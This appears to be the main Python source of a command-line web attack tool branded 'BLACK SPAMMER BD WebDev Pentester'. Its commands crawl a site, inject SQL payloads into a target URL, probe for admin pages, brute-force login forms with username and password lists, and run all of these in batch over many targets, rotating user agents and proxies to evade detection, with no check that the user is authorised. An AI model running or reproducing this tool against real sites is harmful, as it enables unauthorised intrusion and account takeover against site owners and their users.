import os
import re
import click
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from typing import List, Tuple, Dict, Optional

from .config import (
    MAX_THREADS,
    TIMEOUT,
    USE_PROXIES,
    PROXIES,
    OUTPUT_FORMAT,
    OUTPUT_DIR,
    CRAWL_DEPTH,
    RENDER_JS,
    PAYLOAD_MODE,
    config as CONFIG_DICT
)
from .logger import logger
from .utils import (
    get_random_user_agent,
    get_proxies,
    save_output,
    create_folder,
    fetch_html,
    get_session
)
from .payloads.load_payloads import (
    load_sql_payloads,
    load_admin_paths,
    load_passwords,
    load_usernames
)
from .crawler import Crawler
from .reporter import Reporter

def validate_url(ctx: click.Context, param: click.Parameter, value: str) -> str:
    """
    Ensure provided string is a valid URL. Raises UsageError otherwise.
    """
    pattern = re.compile(r"^https?://[^\s/$.?#].[^\s]*$", re.IGNORECASE)
    if not pattern.match(value):
        raise click.UsageError(f"Invalid URL format: {value}")
    return value

def get_domain(url: str) -> str:
    """
    Normalize the domain portion of a URL into a filesystem-safe string.
    Replaces ':' with '_'. E.g., "example.com:8080" → "example.com_8080"
    """
    parsed = urlparse(url)
    return parsed.netloc.replace(":", "_")

def print_logo() -> None:
    """
    Print the branded, bold magenta “BSB” ASCII logo.
    """
    from colorama import Fore, Style
    logo = f"""
{Fore.MAGENTA}{Style.BRIGHT}
┳┓┏┓┳┓
┣┫┗┓┣┫
┻┛┗┛┻┛{Style.RESET_ALL}

{Fore.MAGENTA}      B   S   B   WebDev Pentester   (v1.0.0){Style.RESET_ALL}
"""
    click.echo(logo)

@click.group()
@click.option(
    "--threads",
    "-t",
    type=int,
    default=None,
    help="Override max_threads from config (default from config.yaml).",
)
@click.option(
    "--timeout",
    "-T",
    type=int,
    default=None,
    help="Override HTTP timeout from config (seconds).",
)
@click.option(
    "--proxy",
    "-p",
    type=str,
    default=None,
    help="Single proxy URL to use instead of rotating proxies.",
)
@click.option(
    "--format",
    "-f",
    "out_format",
    type=click.Choice(["json", "csv", "txt"], case_sensitive=False),
    default=None,
    help="Override output format (json/csv/txt).",
)
@click.option(
    "--deep/--quick",
    default=False,
    help="Run 'deep' payload set (all 1,000+), or 'quick' (first 200). Overrides payload_mode.",
)
def main(threads: Optional[int], timeout: Optional[int], proxy: Optional[str], out_format: Optional[str], deep: bool) -> None:
    """
    BLACK SPAMMER BD WebDev Pentester CLI (v1.0.0)

    Use: sp [OPTIONS] COMMAND [ARGS]...
    """
    # Apply runtime overrides to CONFIG_DICT if provided
    if threads is not None:
        CONFIG_DICT["max_threads"] = threads
    if timeout is not None:
        CONFIG_DICT["timeout"] = timeout
    if proxy is not None:
        CONFIG_DICT["use_proxies"] = True
        CONFIG_DICT["proxy_list"] = [proxy]
    if out_format:
        CONFIG_DICT["output"]["format"] = out_format.lower()
    if deep:
        CONFIG_DICT["payload_mode"] = "deep"
    else:
        CONFIG_DICT["payload_mode"] = "quick"

    click.secho("===== BLACK SPAMMER BD WebDev Pentester (v2.0.0) =====", fg="magenta", bold=True)
    print_logo()

@main.command(name="e")
@click.argument("site_url", callback=validate_url)
def extract_links(site_url: str) -> None:
    """
    Extract & recursively crawl all links from SITE_URL (up to CRAWL_DEPTH).
    Respects robots.txt and optional JS rendering.
    Saves to OUTPUT_DIR/links_<domain>.<format>.
    """
    domain = get_domain(site_url)
    crawler = Crawler(site_url)
    crawler.crawl()

    reporter = Reporter(domain)
    reporter.add_links(list(crawler.visited))
    reporter.generate()

@main.command(name="c")
@click.argument("target", callback=validate_url)
def sql_test(target: str) -> None:
    """
    Perform SQL injection testing on TARGET URL.
    Dynamically loads 1,000+ payloads from sql_payloads.txt in 'quick' or 'deep' mode.
    Saves vulnerabilities to OUTPUT_DIR/sql_<domain>.<format>.
    """
    domain = get_domain(target)
    reporter = Reporter(domain)
    vulnerable: List[Tuple[str, str]] = []

    session = get_session()
    payloads = load_sql_payloads()

    def test_payload(payload: str) -> Optional[Tuple[str, str]]:
        test_url = f"{target}{payload}"
        headers = get_random_user_agent()
        proxies = get_proxies()
        try:
            resp = session.get(test_url, headers=headers, timeout=TIMEOUT, proxies=proxies)
            if resp.status_code == 200 and any(
                term in resp.text.lower() for term in [
                    "mysql", "syntax error", "sql", "error", "ora-", "postgresql", "sqlite"
                ]
            ):
                return (payload, test_url)
        except requests.RequestException:
            return None
        return None

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_payload, p) for p in payloads]
        for future in tqdm(as_completed(futures), total=len(payloads), desc="SQL Testing", ncols=80):
            result = future.result()
            if result:
                vulnerable.append(result)

    reporter.add_sql_vuln(vulnerable)
    reporter.generate()

    if vulnerable:
        click.secho(f"[🔴 {len(vulnerable)} SQL vulnerabilities detected:]", fg="red")
        for payload, url in vulnerable:
            click.secho(f"    • Payload: {payload} → {url}", fg="cyan")
    else:
        click.secho("[✅] No SQL injection vulnerabilities found.", fg="green")

@main.command(name="find")
@click.argument("site_url", callback=validate_url)
def find_admin(site_url: str) -> None:
    """
    Discover common admin pages on SITE_URL using 1,000+ paths from admin_paths.txt.
    Runs 'quick' (200) or 'deep' (1,000+) depending on PAYLOAD_MODE.
    Saves to OUTPUT_DIR/admin_<domain>.<format>.
    """
    domain = get_domain(site_url)
    reporter = Reporter(domain)
    found: List[str] = []

    session = get_session()
    paths = load_admin_paths()

    def check_path(path: str) -> Optional[str]:
        url = f"{site_url.rstrip('/')}{path}"
        headers = get_random_user_agent()
        proxies = get_proxies()
        try:
            resp = session.get(url, headers=headers, timeout=TIMEOUT, proxies=proxies)
            if resp.status_code == 200:
                return url
        except requests.RequestException:
            return None
        return None

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(check_path, p) for p in paths]
        for future in tqdm(as_completed(futures), total=len(paths), desc="Admin Path Scan", ncols=80):
            result = future.result()
            if result:
                found.append(result)
                click.secho(f"[🔎 ADMIN FOUND] {result}", fg="cyan")

    reporter.add_admin_pages(found)
    reporter.generate()

    if not found:
        click.secho("[✅] No admin pages found.", fg="green")

@main.command(name="brute")
@click.argument("login_url", callback=validate_url)
def brute_force(login_url: str) -> None:
    """
    Brute-force the login page at LOGIN_URL.
    Loads 1,000+ passwords from passwords.txt and 100+ usernames from usernames.txt.
    Runs 'quick' (first 200 combos) or 'deep' (all combos) based on PAYLOAD_MODE.
    Saves any success to OUTPUT_DIR/brute_<domain>.<format>.
    """
    domain = get_domain(login_url)
    reporter = Reporter(domain)
    success: Optional[Dict[str, str]] = None

    session = get_session()
    passwords = load_passwords()
    usernames = load_usernames()

    # If quick mode, limit to first 200 passwords
    if PAYLOAD_MODE.lower() == "quick":
        passwords = passwords[:200]

    credentials = [(u, p) for u in usernames for p in passwords]

    def attempt_login(creds: Tuple[str, str]) -> Optional[Dict[str, str]]:
        username, pwd = creds
        data = {"username": username, "password": pwd}
        headers = get_random_user_agent()
        proxies = get_proxies()
        try:
            resp = session.post(login_url, data=data, headers=headers, timeout=TIMEOUT, proxies=proxies)
            if resp.status_code in [200, 302] and "logout" in resp.text.lower():
                return {"username": username, "password": pwd}
        except requests.RequestException:
            return None
        return None

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(attempt_login, cred): cred for cred in credentials}
        for future in tqdm(as_completed(futures), total=len(credentials), desc="Brute Forcing", ncols=80):
            result = future.result()
            if result:
                success = result
                click.secho(f"[✅ SUCCESS] {result['username']}:{result['password']}", fg="green")
                # Cancel remaining tasks
                for f in futures:
                    f.cancel()
                break

    reporter.add_brute_results(success or {})
    reporter.generate()

    if not success:
        click.secho("[❌] Brute-force failed to find valid credentials.", fg="red")

@main.command(name="multi")
@click.argument("targets_file", type=click.Path(exists=True, dir_okay=False))
def multi_scan(targets_file: str) -> None:
    """
    Batch-scan multiple targets from a file (one URL per line).
    For each domain, runs –e, –c, –find, and –brute sequentially. Generates unified report.
    """
    with open(targets_file, "r", encoding="utf-8") as f:
        targets = [line.strip() for line in f if line.strip()]

    for url in targets:
        click.secho(f"\n=== 🔍 Scanning: {url} ===", fg="yellow")
        extract_links.callback(url)
        sql_test.callback(url)
        find_admin.callback(url)
        brute_force.callback(url)
